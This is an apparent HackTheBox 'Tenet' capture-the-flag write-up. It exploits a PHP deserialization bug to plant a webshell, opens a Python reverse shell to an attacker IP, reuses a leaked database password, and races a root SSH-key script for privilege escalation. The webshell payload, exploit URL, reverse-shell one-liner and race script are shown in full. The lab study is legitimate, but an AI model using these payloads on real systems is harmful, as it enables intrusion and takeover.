<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Tenet | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,linux,medium"><meta name=description content="Tenet HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/tenet/><link crossorigin=anonymous href=/assets/css/stylesheet.c5de734fbd88c3d21543485ffbcb1ccdda89a86a780cf987fa00199c41dbc947.css integrity="sha256-xd5zT72Iw9IVQ0hf+8sczdqJqGp4DPmH+gAZnEHbyUc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/tenet/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Tenet "><meta property="og:description" content="Tenet HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/tenet/tenet.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2021-06-14T22:27:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/tenet/tenet.png"><meta name=twitter:title content="Tenet "><meta name=twitter:description content="Tenet HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Tenet ","item":"https://s4ch.github.io/writeups/hackthebox/tenet/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Tenet ","name":"Tenet ","description":"Tenet HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","linux","medium"],"articleBody":"Information Name: Tenet Profile: www.hackthebox.eu Difficulty: Medium OS: Linux Points: 30 Overview Install tools used in this WU on BlackArch Linux:\n$ sudo pacman -S nmap wpscan bfac Network enumeration Port and service scan with nmap:\n# Nmap 7.91 scan initiated Sun May 2 16:12:39 2021 as: nmap -sSVC -p- -v -oA nmap_scan 10.10.10.223 Nmap scan report for 10.10.10.223 Host is up (0.028s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA) | 256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA) |_ 256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-methods: |_ Supported Methods: HEAD GET POST OPTIONS |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun May 2 16:13:14 2021 -- 1 IP address (1 host up) scanned in 36.61 seconds Web enumeration As we are facing a Wordpress we can launch a vulnerability scan + user enumeration with wpscan:\n$ wpscan --url http://tenet.htb -e u The two vulnerabilities found are authenticated so we can’t exploit them. Two users are found: neil, protagonist.\nIt’s possible to try to bruteforce the password for those two users but it’s not very efficient:\n$ wpscan --url http://tenet.htb --no-banner -U users.txt -P /usr/share/wordlists/passwords/rockyou.txt I tried to find any vhost but without success:\n$ ffuf -u http://tenet.htb/ -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:cyfun -H 'Host: cyfun.tenet.htb' -fs 10918 There is an interesting comment on wordpress:\ndid you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!\nA post is also giving another hint:\nWe’re looking for beta testers of our new time-management software, ‘Rotas’\n‘Rotas’ will hopefully be coming to market late 2021, pending rigorous QA from our developers, and you!\nFor more information regarding opting-in, watch this space.\nSo I tried to find some backup files with ffuf and bfac but I only got some false positives.\n$ ffuf -u http://tenet.htb/satorFUZZ -c -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt ... .phps [Status: 403, Size: 274, Words: 20, Lines: 10] :: Progress: [39/39] :: Job [1/1] :: 15 req/sec :: Duration: [0:00:04] :: Errors: 0 :: $ ffuf -u http://tenet.htb/rotasFUZZ -c -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt ... .phps [Status: 403, Size: 274, Words: 20, Lines: 10] :: Progress: [39/39] :: Job [1/1] :: 44 req/sec :: Duration: [0:00:02] :: Errors: 0 :: $ bfac -u http://tenet.htb/sator $ bfac -u http://tenet.htb/rotas While you don’t find there is a file sator.php hosted on tenet.htb you have to guess it’s served with the IP address http://10.10.10.223/sator.php (default fallback vhost probably).\n[+] Grabbing users from text file [] Database updated We can find the backup file with bfac:\n$ bfac -u http://10.10.10.223/sator.php ... [i] URL: http://10.10.10.223/sator.php [$] Discovered: -\u003e {http://10.10.10.223/sator.php.bak} (Response-Code: 200 | Content-Length: 514) [i] Findings: http://10.10.10.223/sator.php.bak (200) | (Content-Length: 514) Web exploitation sator.php.bak\n\u003c?php class DatabaseExport { public $user_file = 'users.txt'; public $data = ''; public function update_db() { echo '[+] Grabbing users from text file '; $this-\u003e data = 'Success'; } public function __destruct() { file_put_contents(__DIR__ . '/' . $this -\u003euser_file, $this-\u003edata); echo '[] Database updated '; //\techo 'Gotta get this working properly...'; } } $input = $_GET['arepo'] ?? ''; $databaseupdate = unserialize($input); $app = new DatabaseExport; $app -\u003e update_db(); ?\u003e There is a PHP deserialization here that allow us to upload any arbitrary content.\nWe can even find a similar case on security stackexchange.\nMy PoC to generate the serialized webshell payload:\n\u003c?php class DatabaseExport { public $user_file = 'cyfun.php'; public $data = '\u003c?php system($_GET[\"cmd\"])?\u003e'; } $klass = new DatabaseExport(); $payload = serialize($klass); echo $payload; Here the URL-encoded form:\nhttp://10.10.10.223/sator.php?arepo=O:14:%22DatabaseExport%22:2:{s:9:%22user_file%22;s:9:%22cyfun.php%22;s:4:%22data%22;s:28:%22%3C?php%20system($_GET[%22cmd%22])?%3E%22;}\nThen we can access teh webshell and execute a command: http://10.10.10.223/cyfun.php?cmd=id\nuid=33(www-data) gid=33(www-data) groups=33(www-data) We know the upload and command exec works so let’s execute a reverse shell:\npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.15.44\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' We receive it on our reverse shell:\n$ pwncat -l 9999 -vv INFO: Listening on :::9999 (family 10/IPv6, TCP) INFO: Listening on 0.0.0.0:9999 (family 2/IPv4, TCP) id INFO: Client connected from 10.10.10.223:59112 (family 2/IPv4, TCP) /bin/sh: 0: can't access tty; job control turned off $ uid=33(www-data) gid=33(www-data) groups=33(www-data) cat /etc/passwd\nroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin mysql:x:111:115:MySQL Server,,,:/nonexistent:/bin/false neil:x:1001:1001:neil,,,:/home/neil:/bin/bash Shell upgrade /var/www/html/wordpress\n... /** MySQL database username */ define( 'DB_USER', 'neil' ); /** MySQL database password */ define( 'DB_PASSWORD', 'Opera2112' ); /** MySQL hostname */ define( 'DB_HOST', 'localhost' ); ... We can re-use DB password over SSH: ssh neil@tenet.htb.\nPrivilege Escalation of Machine : from neil to root $ sudo -l Matching Defaults entries for www-data on tenet: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\: User www-data may run the following commands on tenet: (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh A script can be run as root via sudo: /usr/local/bin/enableSSH.sh\n#!/bin/bash checkAdded() { sshName=$(/bin/echo $key | /usr/bin/cut -d \" \" -f 3) if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then /bin/echo \"Successfully added $sshName to authorized_keys file!\" else /bin/echo \"Error in adding $sshName to authorized_keys file!\" fi } checkFile() { if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then /bin/echo \"Error in creating key file!\" if [[ -f $1 ]]; then /bin/rm $1; fi exit 1 fi } addKey() { tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX) (umask 110; touch $tmpName) /bin/echo $key \u003e\u003e$tmpName checkFile $tmpName /bin/cat $tmpName \u003e\u003e/root/.ssh/authorized_keys /bin/rm $tmpName } key=\"ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu\" addKey checkAdded Since mktemp will create a random file we need to make a race condition to write our SSH pub key into it.\n#!/bin/bash key='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINDGLndVd+2+y7FE7nVTrMtBvPiLNTMgObVw8s7d9B8n cyfun@penarch' while true do echo $key | tee /tmp/ssh-* \u003e /dev/null done We execute that while running sudo /usr/local/bin/enableSSH.sh. Several tries may be necessary because race conditions doesn’t always work the 1st time.\nThen we can connect as root.\nssh root@tenet.htb -i ~/.ssh/id_ed25519\n","wordCount":"995","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/tenet/tenet.png","datePublished":"2021-06-14T22:27:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/tenet/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/archives title=Blog><span>Blog</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Tenet</h1><div class=post-description>Tenet HackTheBox writeup</div><div class=post-meta><span title='2021-06-14 22:27:00 +0000 UTC'>June 14, 2021</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;995 words&nbsp;·&nbsp;s4ch</div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/tenet/tenet.png alt="Tenet HackTheBox Machine"><p>Tenet - Medium Linux Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network enumeration</a></li><li><a href=#web-enumeration>Web enumeration</a></li><li><a href=#web-exploitation>Web exploitation</a></li><li><a href=#shell-upgrade>Shell upgrade</a></li><li><a href=#privilege-escalation-of-machine--from-neil-to-root>Privilege Escalation of Machine : from neil to root</a></li></ul></nav></div></details></div><div class=post-content><h1 id=information>Information<a hidden class=anchor aria-hidden=true href=#information>#</a></h1><ul><li><strong>Name:</strong> Tenet</li><li><strong>Profile:</strong> <a href=https://app.hackthebox.eu/machines/309>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Medium</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 30</li></ul><h2 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h2><p>Install tools used in this WU on BlackArch Linux:</p><pre tabindex=0><code>$ sudo pacman -S nmap wpscan bfac
</code></pre><h2 id=network-enumeration>Network enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h2><p>Port and service scan with nmap:</p><pre tabindex=0><code># Nmap 7.91 scan initiated Sun May  2 16:12:39 2021 as: nmap -sSVC -p- -v -oA nmap_scan 10.10.10.223
Nmap scan report for 10.10.10.223
Host is up (0.028s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May  2 16:13:14 2021 -- 1 IP address (1 host up) scanned in 36.61 seconds
</code></pre><h2 id=web-enumeration>Web enumeration<a hidden class=anchor aria-hidden=true href=#web-enumeration>#</a></h2><p>As we are facing a Wordpress we can launch a vulnerability scan + user enumeration
with wpscan:</p><pre tabindex=0><code>$ wpscan --url http://tenet.htb -e u
</code></pre><p>The two vulnerabilities found are authenticated so we can&rsquo;t exploit them.
Two users are found: <code>neil</code>, <code>protagonist</code>.</p><p>It&rsquo;s possible to try to bruteforce the password for those two users but it&rsquo;s not very efficient:</p><pre tabindex=0><code>$ wpscan --url http://tenet.htb --no-banner -U users.txt -P /usr/share/wordlists/passwords/rockyou.txt
</code></pre><p>I tried to find any vhost but without success:</p><pre tabindex=0><code>$ ffuf -u http://tenet.htb/ -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:cyfun -H &#39;Host: cyfun.tenet.htb&#39; -fs 10918
</code></pre><p>There is an interesting comment on wordpress:</p><blockquote><p>did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!</p></blockquote><p>A post is also giving another hint:</p><blockquote><p>We&rsquo;re looking for beta testers of our new time-management software, &lsquo;Rotas&rsquo;</p><p>&lsquo;Rotas&rsquo; will hopefully be coming to market late 2021, pending rigorous QA from our developers, and you!</p><p>For more information regarding opting-in, watch this space.</p></blockquote><p>So I tried to find some backup files with ffuf and bfac but I only got some false positives.</p><pre tabindex=0><code>$ ffuf -u http://tenet.htb/satorFUZZ -c -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt
...

.phps                   [Status: 403, Size: 274, Words: 20, Lines: 10]
:: Progress: [39/39] :: Job [1/1] :: 15 req/sec :: Duration: [0:00:04] :: Errors: 0 ::

$ ffuf -u http://tenet.htb/rotasFUZZ -c -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt
...

.phps                   [Status: 403, Size: 274, Words: 20, Lines: 10]
:: Progress: [39/39] :: Job [1/1] :: 44 req/sec :: Duration: [0:00:02] :: Errors: 0 ::

$ bfac -u http://tenet.htb/sator
$ bfac -u http://tenet.htb/rotas
</code></pre><p>While you don&rsquo;t find there is a file sator.php hosted on tenet.htb you have to
guess it&rsquo;s served with the IP address http://10.10.10.223/sator.php (default fallback vhost probably).</p><pre tabindex=0><code>[+] Grabbing users from text file
[] Database updated
</code></pre><p>We can find the backup file with bfac:</p><pre tabindex=0><code>$ bfac -u http://10.10.10.223/sator.php
...
[i] URL: http://10.10.10.223/sator.php
[$] Discovered: -&gt; {http://10.10.10.223/sator.php.bak} (Response-Code: 200 | Content-Length: 514)

[i] Findings:
http://10.10.10.223/sator.php.bak (200) | (Content-Length: 514)
</code></pre><h2 id=web-exploitation>Web exploitation<a hidden class=anchor aria-hidden=true href=#web-exploitation>#</a></h2><p><code>sator.php.bak</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>DatabaseExport</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>public</span> $user_file <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;users.txt&#39;</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>public</span> $data <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>update_db</span>()
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;[+] Grabbing users from text file &lt;br&gt;&#39;</span>;
</span></span><span style=display:flex><span>    $this<span style=color:#f92672>-&gt;</span> <span style=color:#a6e22e>data</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;Success&#39;</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__destruct</span>()
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>file_put_contents</span>(<span style=color:#66d9ef>__DIR__</span> <span style=color:#f92672>.</span> <span style=color:#e6db74>&#39;/&#39;</span> <span style=color:#f92672>.</span> $this <span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>user_file</span>, $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>data</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;[] Database updated &lt;br&gt;&#39;</span>;
</span></span><span style=display:flex><span>  <span style=color:#75715e>//	echo &#39;Gotta get this working properly...&#39;;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$input <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;arepo&#39;</span>] <span style=color:#f92672>??</span> <span style=color:#e6db74>&#39;&#39;</span>;
</span></span><span style=display:flex><span>$databaseupdate <span style=color:#f92672>=</span> <span style=color:#a6e22e>unserialize</span>($input);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$app <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>DatabaseExport</span>;
</span></span><span style=display:flex><span>$app <span style=color:#f92672>-&gt;</span> <span style=color:#a6e22e>update_db</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>There is a PHP deserialization here that allow us to upload any arbitrary content.</p><p>We can even find a <a href=https://security.stackexchange.com/questions/176263/why-does-this-php-object-injection-exploit-work>similar case</a> on security stackexchange.</p><p>My PoC to generate the serialized webshell payload:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>DatabaseExport</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>public</span> $user_file <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;cyfun.php&#39;</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>public</span> $data <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&lt;?php system($_GET[&#34;cmd&#34;])?&gt;&#39;</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$klass <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>DatabaseExport</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$payload <span style=color:#f92672>=</span> <span style=color:#a6e22e>serialize</span>($klass);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> $payload;
</span></span></code></pre></div><p>Here the URL-encoded form:</p><p>http://10.10.10.223/sator.php?arepo=O:14:%22DatabaseExport%22:2:{s:9:%22user_file%22;s:9:%22cyfun.php%22;s:4:%22data%22;s:28:%22%3C?php%20system($_GET[%22cmd%22])?%3E%22;}</p><p>Then we can access teh webshell and execute a command: http://10.10.10.223/cyfun.php?cmd=id</p><pre tabindex=0><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre><p>We know the upload and command exec works so let&rsquo;s execute a reverse shell:</p><pre tabindex=0><code>python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.15.44&#34;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;
</code></pre><p>We receive it on our reverse shell:</p><pre tabindex=0><code>$ pwncat -l 9999 -vv
INFO: Listening on :::9999 (family 10/IPv6, TCP)
INFO: Listening on 0.0.0.0:9999 (family 2/IPv4, TCP)
id
INFO: Client connected from 10.10.10.223:59112 (family 2/IPv4, TCP)
/bin/sh: 0: can&#39;t access tty; job control turned off
$ uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre><p><code>cat /etc/passwd</code></p><pre tabindex=0><code>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
mysql:x:111:115:MySQL Server,,,:/nonexistent:/bin/false
neil:x:1001:1001:neil,,,:/home/neil:/bin/bash
</code></pre><h2 id=shell-upgrade>Shell upgrade<a hidden class=anchor aria-hidden=true href=#shell-upgrade>#</a></h2><p><code>/var/www/html/wordpress</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>...</span>
</span></span><span style=display:flex><span><span style=color:#e6db74>/** MySQL database username */</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>define</span>( <span style=color:#e6db74>&#39;DB_USER&#39;</span>, <span style=color:#e6db74>&#39;neil&#39;</span> );
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>/** MySQL database password */</span>
